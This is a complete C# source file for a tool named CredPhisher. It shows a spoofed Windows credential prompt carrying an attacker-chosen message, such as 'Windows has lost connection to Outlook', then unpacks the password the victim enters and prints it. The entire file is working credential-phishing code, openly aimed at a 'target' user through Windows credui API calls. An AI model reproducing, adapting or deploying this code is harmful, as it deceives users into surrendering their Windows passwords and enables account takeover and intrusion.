using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace CredPhisher
{
    class MainClass
    {
        [DllImport("ole32.dll")]
        public static extern void CoTaskMemFree(IntPtr ptr);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        private struct CREDUI_INFO
        {
            public int cbSize;
            public IntPtr hwndParent;
            public string pszMessageText;
            public string pszCaptionText;
            public IntPtr hbmBanner;
        }

        [DllImport("credui.dll", CharSet = CharSet.Auto)]
        private static extern bool CredUnPackAuthenticationBuffer(int dwFlags,
            IntPtr pAuthBuffer,
            uint cbAuthBuffer,
            StringBuilder pszUserName,
            ref int pcchMaxUserName,
            StringBuilder pszDomainName,
            ref int pcchMaxDomainame,
            StringBuilder pszPassword,
            ref int pcchMaxPassword);

        [DllImport("credui.dll", CharSet = CharSet.Auto)]
        private static extern int CredUIPromptForWindowsCredentials(ref CREDUI_INFO notUsedHere,
            int authError,
            ref uint authPackage,
            IntPtr InAuthBuffer,
            uint InAuthBufferSize,
            out IntPtr refOutAuthBucffer,
            out uint refOutAuthBufferSize,
            ref bool fSave,
            int flags);

        [DllImport("credui.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern Boolean CredPackAuthenticationBuffer(int dwFlags,
            string pszUserName,
            string pszPassword,
            IntPtr pPackedCredentials,
            ref int pcbPackedCredentials);

        public static void Collector(string message, string name, out NetworkCredential networkCredential)
        {
            CREDUI_INFO credui = new CREDUI_INFO();
            //This block collects the current username and prompts them. This is easily modifiable.
            string username = name;
            credui.pszCaptionText = message;
            credui.pszMessageText = "Please enter your credentials.";
            credui.cbSize = Marshal.SizeOf(credui);
            uint authPackage = 0;
            IntPtr outCredBuffer = new IntPtr();
            int inCredSize = 1024;
            IntPtr inCredBuffer = Marshal.AllocCoTaskMem(inCredSize);
            CredPackAuthenticationBuffer(0, username, "", inCredBuffer, ref inCredSize);
            uint outCredSize;
            bool save = false;
            int result = CredUIPromptForWindowsCredentials(ref credui,
                0,
                ref authPackage,
                inCredBuffer,
                (uint) inCredSize,
                out outCredBuffer,
                out outCredSize,
                ref save,
                1);

            var usernameBuf = new StringBuilder(256);
            var passwordBuf = new StringBuilder(256);
            var domainBuf = new StringBuilder(128);

            int maxUserName = 256;
            int maxDomain = 256;
            int maxPassword = 128;
            if (result == 0)
            {
                if (CredUnPackAuthenticationBuffer(0, outCredBuffer, outCredSize, usernameBuf, ref maxUserName,
                    domainBuf, ref maxDomain, passwordBuf, ref maxPassword))
                {
                    CoTaskMemFree(outCredBuffer);
                    networkCredential = new NetworkCredential()
                    {
                        UserName = username,
                        Password = passwordBuf.ToString(),
                        Domain = domainBuf.ToString()
                    };
                    return;
                }
            }
            networkCredential = null;
        }

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("[-] Please supply the message that will be displayed to the target (ex. 'Windows has lost connection to Outlook') and username.");
                Console.WriteLine("[-] CredPhisher.exe 'Message' 'administrator'");
                return;
            }
            try
            {
                Collector(args[0], args[1], out NetworkCredential networkCredential);
                Console.WriteLine("[+] Collected Credentials:\r\n" +
                    "Username: " + networkCredential.Domain + "\\" + networkCredential.UserName + "\r\n" +
                    "Password: " + networkCredential.Password);
            }
            catch (NullReferenceException)
            {
                Console.WriteLine("[-] User exited prompt");
            }
            catch (Exception)
            {
                Console.WriteLine("[-] Looks like something went wrong...");
            }

        }
    }
}
